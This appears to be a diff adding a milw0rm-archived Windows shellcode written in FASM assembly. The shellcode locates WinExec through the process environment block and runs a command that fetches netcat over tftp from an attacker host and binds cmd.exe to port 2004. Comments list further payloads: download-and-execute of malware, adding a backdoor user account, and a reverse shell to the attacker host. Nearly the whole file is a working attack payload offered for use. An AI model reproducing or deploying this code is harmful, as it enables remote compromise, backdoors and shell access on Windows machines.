@@ -1,0 +1,85 @@
+
+;
+; 73 bytes WinExec() / not including WinExec command parameter (variable size)
+;
+; 'Weiss' -> wyse101@gmail.com / originally written 06-04/updated 01-06
+;
+; Greetz to Greenant,Ash,[29A],WiteG, Limewax & tech freak posse
+;
+; tested on AMD64 3000+ running Windows 2000 SP4, but should work fine on XP.
+; contains no null bytes, assemble with FASM -> http://flatassembler.net/
+;
+; the command here binds cmd.exe to port 2004 using netcat.
+;
+; this one works ;-)
+
+format PE console 4.0
+entry entrypoint
+
+include 'include/win32a.inc'
+
+ATTACKER_HOST   equ   '127.0.0.1'          ; ip of tftp server
+
+section '.text' code readable writeable executable
+
+entrypoint:
+      jmp   init_param
+get_eip:
+      pop   eax
+      inc   byte [eax+nCmdLen-1]        ; nullify tail end of cmd parameter
+      push  eax
+      push   30h
+      pop    ecx
+      mov    eax,[fs:ecx]
+      mov    eax,[eax+0ch]
+      mov    esi,[eax+1ch]
+      lodsd
+      mov   ebx,[eax+08h]
+      ;--------------------
+      mov   eax,[ebx+3ch]
+      mov   eax,[ebx+eax+78h]
+      lea   esi,[ebx+eax+1ch]
+      mov   cl,03h
+load_rva:
+      lodsd
+      add  eax,ebx
+      push eax
+      loop load_rva
+      pop  edx
+      pop  esi
+load_index:
+      mov   edi,[esi+4*ecx]
+      inc   ecx
+      cmp   dword[ebx+edi],'WinE'
+      jne   load_index
+      pop   esi
+      movzx eax,word[edx+2*ecx-2]
+      add   ebx,[esi+4*eax]
+      call  ebx                  ; WinExec(szCmd);
+
+      ;jmp   $                   ; hang
+
+      call  dword[ExitProcess]         ; not required, testing only
+init_param:
+      call   get_eip
+      ;===================================================================
+szCmd:                                        ; insert your command below
+      db     'cmd /c tftp -i ',ATTACKER_HOST,' GET nc.exe nc.exe && nc -Lp2004 -ecmd',0ffh
+nCmdLen      =  $-szCmd
+
+; other examples..all but "net user" requiring tftp server running on ATTACKER_HOST with malware.exe or netcat
+; ready for transfer.
+
+;cmd /c tftp -i ',ATTACKER_HOST,' GET malware.exe && malware.exe		; download & execute file
+;cmd /c tftp -i ',ATTACKER_HOST,' GET nc.exe nc.exe && nc -Lp2004 -ecmd	        ; bind cmd to port 2004
+;cmd /c net user h4x0r 31337 /add ; add username to SAM database
+;cmd /c tftp -i ',ATTACKER_HOST,' GET nc.exe nc.exe && nc ',ATTACKER_HOST,' 2004 -ecmd	; reverse-connect cmd port 2004
+
+; section below not required, simply for testing.
+section '.idata' import data readable writeable
+
+   library kernel,'kernel32.dll'
+   
+   import kernel,ExitProcess,'ExitProcess'
+
+; milw0rm.com [2006-01-24]
